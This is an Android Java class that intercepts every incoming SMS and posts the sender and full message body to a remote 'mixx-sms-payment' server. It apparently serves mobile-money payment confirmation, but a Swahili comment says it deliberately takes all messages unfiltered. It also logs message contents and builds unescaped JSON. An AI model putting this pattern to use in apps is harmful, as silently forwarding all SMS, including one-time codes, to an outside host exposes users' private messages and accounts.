package com.ghosttester.kumbukumbu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String SERVER_URL = "https://GhostTester.pythonanywhere.com/api/mixx-sms-payment";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "📱 SMS RECEIVED - STARTING PROCESS");

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();

                    Log.d(TAG, "📨 SMS From: " + sender);
                    Log.d(TAG, "💬 SMS Body: " + messageBody);

                    // CHUKUA SMS ZOTE - HAITAFUTI PATTERNS
                    Log.d(TAG, "✅ TAKING ALL SMS - SENDING TO SERVER");
                    sendToServer(sender, messageBody);
                }
            }
        }
    }

    private void sendToServer(final String sender, final String messageBody) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Tuma data yote ya SMS
                    String jsonData = "{" +
                            "\"sms_content\": \"" + messageBody.replace("\"", "\\\"").replace("\n", " ") + "\"," +
                            "\"sender_number\": \"" + sender + "\"," +
                            "\"timestamp\": \"" + System.currentTimeMillis() + "\"" +
                            "}";

                    Log.d(TAG, "📤 Sending to server: " + SERVER_URL);
                    Log.d(TAG, "📊 Data: " + jsonData);

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes());
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "✅ Server Response Code: " + responseCode);

                    // Read response
                    BufferedReader br = new BufferedReader(new InputStreamReader(
                            responseCode == 200 ? conn.getInputStream() : conn.getErrorStream()
                    ));
                    String responseLine;
                    StringBuilder response = new StringBuilder();
                    while ((responseLine = br.readLine()) != null) {
                        response.append(responseLine);
                    }
                    br.close();

                    Log.d(TAG, "📥 Server Response: " + response.toString());

                    conn.disconnect();

                } catch (Exception e) {
                    Log.e(TAG, "❌ ERROR: " + e.getMessage());
                }
            }
        }).start();
    }
}
